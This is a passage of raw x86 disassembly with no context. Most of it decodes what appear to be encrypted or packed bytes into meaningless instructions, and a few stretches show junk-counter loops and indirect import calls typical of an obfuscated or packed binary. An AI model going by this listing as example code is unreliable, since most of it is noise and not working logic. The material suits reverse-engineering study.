  4081a6:	adc    DWORD PTR [edx+0x6158b9ee],esi
  4081ac:	int3   
  4081ad:	pop    ds
  4081ae:	fdiv   QWORD PTR [edx]
  4081b0:	push   ds
  4081b1:	pop    ss
  4081b2:	sahf   
  4081b3:	lods   eax,DWORD PTR ds:[esi]
  4081b4:	stos   DWORD PTR es:[edi],eax
  4081b5:	scas   al,BYTE PTR es:[edi]
  4081b6:	mov    ecx,0x2604d04e
  4081bb:	sub    al,0xb1
  4081bd:	mov    ds:0x621d9054,al
  4081c2:	(bad)  
  4081c3:	adc    ebp,esp
  4081c5:	popa   
  4081c6:	mov    eax,ds:0x611fe514
  4081cb:	push   cs
  4081cc:	aad    0x15
  4081ce:	inc    edx
  4081cf:	mov    esp,0x4b80ab2f
  4081d4:	fucomip st,st(3)
  4081d6:	and    DWORD PTR [esi+0x60],esp
  4081d9:	inc    esi
  4081da:	xor    ah,BYTE PTR cs:[edi+0x5a]
  4081de:	int    0xa1
  4081e0:	cmp    eax,0x377e9d46
  4081e5:	sbb    DWORD PTR [eax+0x66],0x3f
  4081e9:	retf   0xbed0
  4081ec:	aam    0x23
  4081ee:	adc    dh,ch
  4081f0:	sti    
  4081f1:	push   ebp
  4081f2:	sub    al,0x7e
  4081f4:	lods   al,BYTE PTR cs:[esi]
  4081f6:	shr    BYTE PTR [ebp-0x5396ad09],1
  4081fc:	nop
  4081fd:	dec    esp
  4081fe:	les    edx,FWORD PTR [eax+0x60]
  408201:	test   DWORD PTR [ecx+0x7b165bd5],esi
  408207:	mov    eax,0x3333e01d
  40820c:	dec    esi
  40820d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40820e:	je     0x40825a
  408210:	scas   al,BYTE PTR es:[edi]
  408211:	xor    ah,BYTE PTR ss:[esi+eax*8+0x9]
  408216:	(bad)  
  408217:	xchg   esi,eax
  408218:	pop    edx
  408219:	dec    eax
  40821a:	arpl   WORD PTR [ecx],sp
  40821c:	mov    dl,0xc0
  40821e:	or     dh,BYTE PTR [ebx+0x4d]
  408221:	out    0x12,al
  408223:	repz arpl si,si
  408226:	ret    0xbfe0
  408229:	cmp    DWORD PTR [ebp+0x4f2771df],esp
  40822f:	int    0x80
  408231:	mov    ecx,0x3cfd674d
  408236:	jae    0x408295
  408238:	xor    esp,ebx
  40823a:	sub    dl,ah
  40823c:	bound  ebx,QWORD PTR [esi+0x7313f2fc]
  408242:	idiv   ebp
  408244:	in     al,dx
  408245:	ret    
  408246:	mov    al,ds:0x2aa71b1f
  40824b:	push   DWORD PTR [ebp+0x7c]
  40824e:	jp     0x4081d6
  408250:	cld    
  408251:	pop    ss
  408252:	push   ebp
  408253:	lods   eax,DWORD PTR ds:[esi]
  408254:	mov    dh,0xe
  408256:	sub    eax,0xf0b6c5ac
  40825b:	in     eax,0xf1
  40825d:	xor    al,0x2d
  40825f:	mov    bh,0xe
  408261:	sub    BYTE PTR [ebx+esi*4+0x4b],0x3e
  408266:	inc    ecx
  408267:	or     BYTE PTR [edx+ebx*4+0x1e0f9fec],bl
  40826e:	stc    
  40826f:	and    eax,0xfd34931e
  408274:	cmp    BYTE PTR [esi-0x11],cl
  408277:	enter  0xbc74,0x7a
  40827b:	jl     0x4082e5
  40827d:	les    ebx,FWORD PTR ds:0xcacaf940
  408283:	int3   
  408284:	jmp    DWORD PTR [eax+0x3f132672]
  40828a:	call   0x1207:0x8e52ac5f
  408291:	push   0x1f
  408293:	clc    
  408294:	add    ah,0xc6
  408297:	adc    al,0x9e
  408299:	mov    ds:0x8b9f004d,al
  40829e:	fadd   QWORD PTR [esi-0x6ae273ae]
  4082a4:	sub    eax,0xd9090bb7
  4082a9:	popa   
  4082aa:	popa   
  4082ab:	push   ebx
  4082ac:	xchg   ebx,eax
  4082ad:	iret   
  4082ae:	inc    ebp
  4082af:	lea    esp,[ebp-0x187e1cbd]
  4082b5:	inc    ecx
  4082b6:	dec    eax
  4082b7:	mov    ch,0xab
  4082b9:	xor    BYTE PTR ds:0x7c9dc433,0xf2
  4082c0:	or     ah,ch
  4082c2:	or     ecx,eax
  4082c4:	(bad)  
  4082c5:	imul   edi,DWORD PTR [edx+0x6d7022b0],0x72
  4082cc:	cld    
  4082cd:	dec    ecx
  4082ce:	mov    esp,fs
  4082d0:	ss jg  0x4082c8
  4082d3:	out    dx,eax
  4082d4:	in     al,dx
  4082d5:	gs ss mov dh,0x29
  4082d9:	dec    edi
  4082da:	mov    eax,edi
  4082dc:	mov    ch,0xa
  4082de:	pop    ebp
  4082df:	sbb    BYTE PTR [eax],ch
  4082e1:	shl    DWORD PTR [edx+0x1d07b037],0xbf
  4082e8:	jbe    0x408323
  4082ea:	aas    
  4082eb:	inc    esi
  4082ec:	jmp    0x6558:0xaaadf97
  4082f3:	mov    BYTE PTR [edx],dh
  4082f5:	cmp    cl,BYTE PTR [ebp+0x5]
  4082f8:	mov    al,ds:0x2fa12ed9
  4082fd:	out    0xa6,eax
  4082ff:	mov    edi,0x8dff3751
  408304:	out    dx,eax
  408305:	sbb    BYTE PTR [ecx+ebp*8+0x1245d4ce],cl
  40830c:	cmp    dh,0xb7
  40830f:	mov    ebx,DWORD PTR [ecx]
  408311:	pop    eax
  408312:	pop    ebx
  408313:	xchg   esp,eax
  408314:	mov    eax,ds:0x788f400b
  408319:	pop    es
  40831a:	shl    ebp,1
  40831c:	nop
  40831d:	cli    
  40831e:	mov    ecx,0xd52b9f75
  408323:	sub    BYTE PTR [ebx+0x462cd39e],ch
  408329:	mov    al,0xc3
  40832b:	dec    edx
  40832c:	mov    bl,0xd1
  40832e:	jp     0x408359
  408330:	jno    0x408361
  408332:	sub    al,0x74
  408334:	pop    esi
  408335:	icebp  
  408336:	cli    
  408337:	popa   
  408338:	add    bh,BYTE PTR [eax+esi*4+0x5dd239ab]
  40833f:	mov    edi,ebp
  408341:	mov    ds:0xb1e2c4cb,al
  408346:	sub    ch,BYTE PTR [esi-0x76]
  408349:	ins    BYTE PTR es:[edi],dx
  40834a:	and    al,0x88
  40834c:	inc    ebp
  40834d:	cmp    BYTE PTR [esi-0x36fbbe10],dl
  408353:	dec    ebp
  408354:	xor    eax,edx
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4344ef,0x17
  408394:	cmp    DWORD PTR ds:0x4344ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4344ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434553
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4344ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4344ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4344ef,eax
  4083e0:	mov    eax,ds:0x4344ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4344ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434613
  4083f7:	sbb    DWORD PTR ds:0x434503,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434587,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434583
  408413:	sbb    DWORD PTR ds:0x434613,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	and    eax,0xfbd361d0
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	jno    0x4083f0
  408439:	out    0x71,eax
  40843b:	imul   ebx,DWORD PTR [ebx+0x60],0x1e
  40843f:	jl     0x4083d1
  408441:	cld    
  408442:	push   ss
  408443:	push   edi
  408444:	sub    ebx,DWORD PTR [edi-0x420585fa]
  40844a:	jg     0x408449
  40844c:	mov    dh,0xee
  40844e:	ja     0x4083da
  408450:	jb     0x40843d
  408452:	popf   
  408453:	repz pushf 
  408455:	in     eax,0xac
  408457:	xchg   ecx,eax
  408458:	mov    ds:0x7a145df9,al
  40845d:	pop    ecx
  40845e:	xchg   edx,eax
  40845f:	mov    esi,0x2b146a53
  408464:	scas   al,BYTE PTR es:[edi]
  408465:	add    ebx,DWORD PTR [edx+ecx*4]
  408468:	push   cs
  408469:	cld    
  40846a:	retf   0x1ce4
  40846d:	fwait
  40846e:	add    bh,BYTE PTR [esi]
  408470:	pop    edi
  408471:	out    0x86,eax
  408473:	inc    ebx
  408474:	adc    BYTE PTR [esi+0x2566763b],bl
  40847a:	xchg   esi,eax
  40847b:	jecxz  0x4084a4
  40847d:	jle    0x4084fd
  40847f:	push   ds
  408480:	out    dx,al
  408481:	sbb    BYTE PTR [esi-0x55],0x3a
  408485:	jbe    0x408424
  408487:	push   eax
  408488:	jb     0x4084e6
  40848a:	(bad)  
  40848b:	lock hlt 
  40848d:	(bad)  
  40848e:	sbb    al,0xce
  408490:	push   0xffffffbe
  408492:	aaa    
  408493:	cmp    eax,0x99aff14f
  408498:	push   cs
  408499:	cmp    DWORD PTR [edx],eax
  40849b:	mov    bh,0xda
  40849d:	loopne 0x4084e0
  40849f:	xchg   edi,eax
  4084a0:	test   BYTE PTR [eax+0x33b877b5],al
  4084a6:	icebp  
  4084a7:	aad    0x32
  4084a9:	aas    
  4084aa:	inc    ebp
  4084ab:	test   ebp,esi
  4084ad:	push   cs
  4084ae:	outs   dx,BYTE PTR ds:[esi]
  4084af:	add    edi,eax
  4084b1:	adc    bh,dl
  4084b3:	shr    edi,0x45
  4084b6:	mov    ebx,0x73f341ca
  4084bb:	sbb    edx,DWORD PTR [ecx]
  4084bd:	add    DWORD PTR [edx],ebp
  4084bf:	cmp    DWORD PTR [esi-0x7a],ebx
  4084c2:	int    0x21
  4084c4:	js     0x40845e
  4084c6:	mov    eax,ds:0xff83a8bc
  4084cb:	xor    ebx,DWORD PTR [ecx+esi*4-0x3bc9b32c]
  4084d2:	out    0x45,eax
  4084d4:	cmp    eax,0x6354078
  4084d9:	push   cs
  4084da:	ins    BYTE PTR es:[edi],dx
  4084db:	in     eax,dx
  4084dc:	pop    ss
  4084dd:	mov    esi,0x45564801
  4084e2:	inc    edi
  4084e3:	test   eax,0x1126f350
  4084e8:	hlt    
  4084e9:	lea    ebp,[eax+eax*4]
  4084ec:	jae    0x408510
  4084ee:	or     edi,DWORD PTR [ebx-0x203ec84b]
  4084f4:	mul    BYTE PTR [edx+0x26e48b4e]
  4084fa:	pop    ebp
  4084fb:	std    
  4084fc:	pop    ebp
  4084fd:	xchg   esi,eax
  4084fe:	xlat   BYTE PTR ds:[ebx]
  4084ff:	xor    esi,ecx
  408501:	xchg   esp,eax
  408502:	in     al,0x29
  408504:	add    DWORD PTR [ebx],esp
  408506:	test   eax,0xa15a68f
  40850b:	inc    edx
  40850c:	inc    esp
  40850d:	jp     0x408579
  40850f:	cmc    
  408510:	mov    bh,0x23
  408512:	or     al,dh
  408514:	pop    eax
  408515:	gs sbb eax,0xed26c98b
  40851b:	repnz and DWORD PTR [ebp+0x5d],eax
  40851f:	cmp    cl,cl
  408521:	inc    esi
  408522:	mov    dl,0x6e
  408524:	in     eax,0x18
  408526:	cs jmp 0x675b1bfc
  40852c:	sbb    al,0xbf
  40852e:	jb     0x408532
  408530:	in     eax,dx
  408531:	xchg   BYTE PTR ds:0xe0d39fe6,ch
  408537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408538:	gs push ebx
  40853a:	jo     0x40857a
  40853c:	pop    ebp
  40853d:	stos   DWORD PTR es:[edi],eax
  40853e:	dec    esi
  40853f:	inc    ecx
  408540:	mov    ch,0x1b
  408542:	lds    esp,FWORD PTR [ebx-0x6fbb9066]
  408548:	pop    esi
  40854a:	pop    es
  40854b:	lods   eax,DWORD PTR ds:[esi]
  40854c:	mov    dl,bh
  40854e:	fs jmp 0x40850f
  408551:	fisttp WORD PTR ss:[edi+0x14da6e74]
  408558:	fsubr  QWORD PTR [ecx-0x70d8991]
  40855e:	sbb    ebp,DWORD PTR [ecx+0x72dfac7f]
  408564:	push   edx
  408565:	sub    al,0xa0
  408567:	mov    eax,ds:0x35723c7b
  40856c:	xchg   dh,dl
  40856e:	xor    eax,0xc0b7704a
  408573:	push   0xaef249bf
  408578:	adc    BYTE PTR [ecx+0x4a],al
  40857b:	pusha  
  40857c:	loop   0x40855a
  40857e:	pop    ebp
  40857f:	call   0x3ca002a3
  408584:	scas   eax,DWORD PTR es:[edi]
  408585:	jmp    0xada4295
  40858a:	add    al,ah
  40858c:	push   esp
  40858d:	inc    esi
  40858e:	sahf   
  40858f:	fwait
  408590:	psllw  mm5,mm1
  408593:	dec    eax
  408594:	and    BYTE PTR [edi],ch
  408596:	add    al,dh
  408598:	iret   
  408599:	lahf   
  40859a:	scas   al,BYTE PTR es:[edi]
  40859b:	inc    edi
  40859c:	mov    bl,0x2d
  40859e:	sbb    BYTE PTR [esi-0x4d],0xf1
  4085a2:	fsubr  QWORD PTR [ebp+0x7c]
  4085a5:	inc    esi
  4085a6:	lds    ecx,FWORD PTR ds:0xb740d21f
  4085ac:	sbb    edx,ebx
  4085ae:	loop   0x408544
  4085b0:	sub    esp,edx
  4085b2:	popa   
  4085b3:	xchg   ebx,eax
  4085b4:	push   cs
  4085b5:	pop    edi
  4085b6:	fwait
  4085b7:	push   0x6f64d590
  4085bc:	lods   al,BYTE PTR ds:[esi]
  4085bd:	int    0xd9
  4085bf:	into   
  4085c0:	pushf  
  4085c1:	inc    esi
  4085c2:	rol    eax,cl
  4085c4:	(bad)  
  4085c5:	push   0xcb86b502
  4085ca:	pusha  
  4085cb:	cwde   
  4085cc:	jmp    0xf0f6558b
  4085d1:	push   0xffffff9e
  4085d3:	xor    ebp,DWORD PTR [edx+0x1f69f329]
  4085d9:	push   ss
  4085da:	shl    DWORD PTR [edi+ebp*1],0x7a
  4085de:	lock adc al,0xda
  4085e1:	jmp    0x62de:0x1cde46fb
  4085e8:	into   
  4085e9:	fwait
  4085ea:	and    BYTE PTR [eax],dl
  4085ec:	mov    eax,0x8712db45
  4085f1:	pop    ds
  4085f2:	out    dx,eax
  4085f3:	xchg   edx,eax
  4085f4:	mov    ch,0xd1
  4085f6:	add    DWORD PTR ds:0xc11c1c73,ebx
  4085fc:	dec    esi
  4085fd:	mov    esp,0x78761358
  408602:	xor    DWORD PTR [edi+0xdbb4e70],edi
  408608:	es hlt 
  40860a:	jne    0x40861a
  40860c:	cmp    BYTE PTR [eax-0x59e38346],bh
  408612:	fadd   QWORD PTR [ecx-0x21]
  408615:	mov    WORD PTR [ebx-0x627ea9b3],gs
  40861b:	enter  0xea42,0xf9
  40861f:	inc    esi
  408620:	sub    al,0x4c
  408622:	mov    ebx,0x8d55c85c
  408627:	mov    BYTE PTR [edi+0x1150c66f],dh
  40862d:	faddp  st(3),st
  40862f:	fisub  WORD PTR [ebp-0x2c26f43c]
  408635:	(bad)  
  408636:	jp     0x40867f
  408638:	fstp   QWORD PTR [ebx-0x3c]
  40863b:	or     eax,0x494712ab
  408640:	into   
  408641:	fwait
  408642:	imul   esp,DWORD PTR [edx+0x57063a3],0xfffffff1
  408649:	mov    al,ds:0x858e95f0
  40864e:	or     eax,0xebc69b1b
  408653:	or     DWORD PTR ds:0x128fe,ebx
  408659:	jnp    0x408684
  40865b:	fadd   DWORD PTR [edx]
  40865d:	pusha  
  40865e:	xchg   edi,eax
  40865f:	js     0x4086ac
  408661:	cmc    
  408662:	sub    edi,DWORD PTR [esi-0x5f677539]
  408668:	aas    
  408669:	jle    0x40865f
  40866b:	sbb    al,0x51
  40866d:	or     DWORD PTR [esi],edi
  40866f:	xchg   esi,eax
  408670:	cmp    bl,bl
  408672:	sar    BYTE PTR [edx+0x2e],1
  408675:	in     al,0x82
  408677:	sub    eax,DWORD PTR [ecx]
  408679:	xor    al,0xcd
  40867b:	outs   dx,DWORD PTR ds:[esi]
  40867c:	adc    edi,eax
  40867e:	sub    edx,esp
  408680:	mov    ds:0x99dd9646,eax
  408685:	xor    dh,BYTE PTR [edx]
  408687:	mov    ecx,0xe61053e7
  40868c:	add    BYTE PTR [ebx],bh
  40868e:	fiadd  DWORD PTR [eax+0x342b84ec]
  408694:	fisttp QWORD PTR [ebx]
  408696:	xchg   ebx,eax
  408697:	xchg   edi,eax
  408698:	fiadd  DWORD PTR [esi-0x432f6e4e]
  40869e:	mov    ah,0x4f
  4086a0:	lea    ebp,[ecx-0x42]
  4086a3:	push   ecx
  4086a4:	or     BYTE PTR [ecx+0x7],dl
  4086a7:	and    DWORD PTR ds:0x4344ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4344ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4344ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4344ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4344ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4344ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4344ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4344ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434583
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0xca1b3fc8
  408731:	(bad)  
  408732:	aaa    
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	jecxz  0x408784
  40873d:	mov    ds:0x473683f7,eax
  408742:	retf   0x1702
  408745:	stc    
  408746:	fdivr  DWORD PTR es:[eax+0x4c9847a7]
  40874d:	aad    0x8
  40874f:	push   edx
  408750:	xchg   ebx,eax
  408751:	push   ebx
  408752:	add    ecx,eax
  408754:	cdq    
  408755:	xchg   edi,eax
  408756:	imul   edx,DWORD PTR [ecx+0x2b536b04],0xffffffb9
  40875d:	stos   BYTE PTR es:[edi],al
  40875e:	sub    al,BYTE PTR [eax]
  408760:	shr    DWORD PTR [edi+0x3f],0x41
  408764:	jmp    0x4589:0xa464681f
  40876b:	test   ah,dl
  40876d:	adc    DWORD PTR [esi+esi*8+0x12a533c7],esp
  408774:	sub    DWORD PTR [esi-0x54],ebx
  408777:	or     ah,BYTE PTR [ecx]
  408779:	cmp    al,0xcc
  40877b:	jecxz  0x4087d4
  40877d:	ficom  DWORD PTR [ebx+0x5d]
  408780:	out    0xf7,al
  408782:	adc    BYTE PTR [edx-0x5526fc66],al
  408788:	adc    eax,0x48c65823
  40878d:	sahf   
  40878e:	inc    ecx
  40878f:	sub    bh,bh
  408791:	dec    ebp
  408792:	loop   0x408721
  408794:	xchg   esi,eax
  408795:	fs push esp
  408797:	xchg   DWORD PTR [esi+edi*1+0x6ca83f27],eax
  40879e:	adc    esp,edx
  4087a0:	sbb    BYTE PTR [ebx+0x11],dl
  4087a3:	in     eax,dx
  4087a4:	mov    eax,0x25925d25
  4087a9:	(bad)  
  4087aa:	and    BYTE PTR [edi],cl
  4087ac:	(bad)  
  4087ae:	jo     0x4087d5
  4087b0:	addr16 std 
  4087b2:	ret    0x1c2
  4087b5:	jno    0x408800
  4087b7:	lahf   
  4087b8:	jno    0x4087b7
  4087ba:	repz push edi
  4087bc:	mov    ds:0x7b5244d4,eax
  4087c1:	pop    eax
  4087c2:	stos   BYTE PTR es:[edi],al
  4087c3:	das    
  4087c4:	pop    eax
  4087c5:	dec    ecx
  4087c6:	aam    0x8
  4087c8:	xor    dl,0xa4
  4087cb:	lahf   
  4087cc:	lahf   
  4087cd:	mov    eax,0x45046900
  4087d2:	jp     0x4087e4
  4087d4:	xchg   ebx,eax
  4087d5:	fst    DWORD PTR [ebx-0x60]
  4087d8:	xchg   esp,eax
  4087d9:	push   ss
  4087da:	add    eax,ebx
  4087dc:	cmp    BYTE PTR [ebx+0x72443d20],bl
  4087e2:	retf   0x6c10
  4087e5:	xor    BYTE PTR [esi+0x4a1b84fa],cl
  4087eb:	inc    esi
  4087ec:	jae    0x40880d
  4087ee:	inc    edi
  4087ef:	pop    edx
  4087f0:	nop
  4087f1:	stos   DWORD PTR es:[edi],eax
  4087f2:	xchg   esi,eax
  4087f3:	cs out dx,eax
  4087f5:	cdq    
  4087f6:	lea    eax,[ebp+0x4a]
  4087f9:	test   al,0xb0
  4087fb:	pop    es
  4087fc:	and    edi,DWORD PTR [edi-0x2b]
  4087ff:	dec    edx
  408800:	sbb    BYTE PTR [edi+ebx*8+0x2e],ah
  408804:	jp     0x4087a2
  408806:	call   0xfa639ba
  40880b:	out    dx,eax
  40880c:	jb     0x40887c
  40880e:	loope  0x408812
  408810:	xor    DWORD PTR [edi+0x10],ebp
  408813:	ins    DWORD PTR es:[edi],dx
  408814:	in     eax,0xf5
  408816:	or     BYTE PTR [ecx+0x58203c5b],ah
  40881c:	add    cl,BYTE PTR [ecx]
  40881e:	fwait
  40881f:	popf   
  408820:	mov    esi,0xda92870e
  408825:	sar    DWORD PTR [edi+ecx*2],1
  408828:	pop    edi
  408829:	outs   dx,BYTE PTR ds:[esi]
  40882a:	rcl    BYTE PTR [ebx],0xb4
  40882d:	dec    edi
  40882e:	xchg   ebp,eax
  40882f:	push   ebx
  408830:	push   esi
  408831:	add    eax,0x27357c91
  408836:	scas   eax,DWORD PTR es:[edi]
  408837:	aaa    
  408838:	mov    ah,0x6c
  40883a:	dec    ecx
  40883b:	mov    es,WORD PTR [eax+0x1b]
  40883e:	jne    0x40889f
  408840:	iret   
  408841:	mov    ?,WORD PTR [ebx+0x7c7ecb27]
  408847:	push   esi
  408848:	mov    cl,0xe8
  40884a:	inc    ebp
  40884b:	jmp    0x5a39974
  408850:	xchg   ebx,eax
  408851:	pop    ss
  408852:	test   BYTE PTR [edx+0x4d],bh
  408855:	icebp  
  408856:	or     DWORD PTR [ebp-0x37],0x52
  40885a:	pop    ds
  40885b:	pop    esp
  40885c:	fadd   DWORD PTR [esi+0xb]
  40885f:	in     eax,0x93
  408861:	mov    edi,0xf85759ac
  408866:	(bad)  
  408867:	popa   
  408868:	jo     0x4088af
  40886a:	shl    DWORD PTR [esi-0x4e],cl
  40886d:	sub    ch,ah
  40886f:	push   eax
  408870:	inc    ebx
  408871:	xchg   esi,eax
  408872:	push   eax
  408873:	xchg   ecx,eax
  408874:	test   eax,0x6c717e6
  408879:	retf   
  40887a:	popf   
  40887b:	and    DWORD PTR [ebx],ebp
  40887d:	popa   
  40887e:	jo     0x4088cc
  408880:	ds ret 0xf625
  408884:	add    eax,DWORD PTR [edi]
  408886:	in     eax,dx
  408887:	scas   al,BYTE PTR es:[edi]
  408888:	add    ebp,DWORD PTR [esi-0x70]
  40888b:	je     0x408842
  40888d:	mov    DWORD PTR [esi+0x6e0ab654],ecx
  408893:	xor    al,0x46
  408895:	stc    
  408896:	sahf   
  408897:	or     al,0xb8
  408899:	lock push edi
  40889b:	lds    edx,FWORD PTR [ebx+0x14]
  40889e:	sar    BYTE PTR [ebx+ecx*8],0x55
  4088a2:	pop    ebp
  4088a3:	cld    
  4088a4:	jg     0x40884c
  4088a6:	int    0x97
  4088a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a9:	test   BYTE PTR [esi],dl
  4088ab:	imul   ebx,esi,0xacb5a9ad
  4088b1:	jp     0x408845
  4088b3:	int3   
  4088b4:	aad    0x2a
  4088b6:	and    BYTE PTR [ebp+0xa2639b],dl
  4088bc:	sbb    bh,BYTE PTR [esi-0x32]
  4088bf:	ret    
  4088c0:	scas   al,BYTE PTR es:[edi]
  4088c1:	outs   dx,BYTE PTR ds:[esi]
  4088c2:	int3   
  4088c3:	push   esi
  4088c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088c5:	sub    ebx,edx
  4088c7:	ficomp DWORD PTR [edx]
  4088c9:	retf   
  4088ca:	cld    
  4088cb:	retf   
  4088cc:	jg     0x40886c
  4088ce:	xor    DWORD PTR ds:0x857c432,0x23424ac7
  4088d8:	mov    ds:0x3b8b34bf,al
  4088dd:	jae    0x408945
  4088df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088e0:	mov    eax,0x1d3fc92d
  4088e5:	mov    esp,esi
  4088e7:	int3   
  4088e8:	push   ss
  4088e9:	aad    0x80
  4088eb:	push   ss
  4088ec:	inc    esp
  4088ed:	or     DWORD PTR [ebx-0xb2a48d9],edx
  4088f3:	and    BYTE PTR [eax+0x46ef96bc],dh
  4088f9:	test   al,0x25
  4088fb:	icebp  
  4088fc:	mov    bh,0xfa
  4088fe:	and    edx,DWORD PTR [ecx-0x20bf1c20]
  408904:	sub    al,0x78
  408906:	leave  
  408907:	and    al,0xbe
  408909:	int    0x77
  40890b:	jb     0x40891f
  40890d:	mov    BYTE PTR ds:[edx],bh
  408910:	adc    eax,0x6b93c461
  408915:	iret   
  408916:	pop    es
  408917:	test   dh,0x7f
  40891a:	xchg   ebp,eax
  40891b:	lock imul esi,esp,0x79
  40891f:	push   ebx
  408920:	stos   DWORD PTR es:[edi],eax
  408921:	fbstp  TBYTE PTR [esi+0x10]
  408924:	push   0xaef7ed38
  408929:	mov    al,ds:0x9cc0c2e0
  40892e:	sbb    al,0x5
  408930:	jnp    0x4088b9
  408932:	push   es
  408933:	div    DWORD PTR [eax-0x8372c2f]
  408939:	mov    ch,BYTE PTR ds:0xac06a1a0
  40893f:	push   cs
  408940:	popa   
  408941:	jl     0x4089b3
  408943:	sub    BYTE PTR ss:[edi],dh
  408946:	ss push ecx
  408948:	mov    ebp,0x5978ec5d
  40894d:	hlt    
  40894e:	mov    eax,ds:0x8589740c
  408953:	stos   BYTE PTR es:[edi],al
  408954:	fadd   DWORD PTR [bp+si+0x3e2d]
  408959:	mov    dl,0x16
  40895b:	sbb    DWORD PTR fs:[ebp+0x45b617f7],esp
  408962:	fdiv   st,st(4)
  408964:	jmp    0x408963
  408966:	gs pop ds
  408968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408969:	sbb    cl,BYTE PTR [ecx-0x1f48cb0b]
  40896f:	ss rcl esp,cl
  408972:	into   
  408973:	inc    esi
  408974:	push   ebp
  408975:	mov    esi,0x980c0f8d
  40897a:	mov    ebp,0x91e5a910
  40897f:	lds    edx,FWORD PTR [esi+0x64]
  408982:	cmp    edx,edi
  408984:	mov    cl,0x3c
  408986:	out    0x87,eax
  408988:	push   0xcc9de602
  40898d:	outs   dx,DWORD PTR ds:[esi]
  40898e:	inc    edx
  40898f:	push   edi
  408990:	mov    dh,0xac
  408992:	push   ss
  408993:	mov    edx,0xe1c892b0
  408998:	popa   
  408999:	or     BYTE PTR [esi+0x3b],dl
  40899c:	inc    cl
  40899e:	add    ecx,esi
  4089a0:	pop    es
  4089a1:	sub    eax,0x8b51a537
  4089a6:	mov    edi,DWORD PTR [ebp+0x8]
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x4344eb
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	push   ds
  4089db:	std    
  4089dc:	test   esi,edx
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	mov    cl,0x5
  4089e8:	adc    BYTE PTR [edx+0x56283bca],cl
  4089ee:	mov    al,0x67
  4089f0:	xor    ecx,0x3115022d
  4089f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089f7:	sar    DWORD PTR es:[edx],0xb2
  4089fb:	mov    dl,0xad
  4089fd:	mov    edx,0xae6565ef
  408a02:	ins    BYTE PTR es:[edi],dx
  408a03:	lock xchg ecx,eax
  408a05:	xlat   BYTE PTR ds:[ebx]
  408a06:	jbe    0x4089f4
  408a08:	cmp    cl,BYTE PTR [edx+eiz*2+0x1e]
  408a0c:	jbe    0x408a10
  408a0e:	inc    esi
  408a0f:	xor    eax,0x8c9cd2de
  408a14:	sbb    eax,0x96549271
  408a19:	sub    DWORD PTR [di-0x7465],edi
  408a1e:	jno    0x408a47
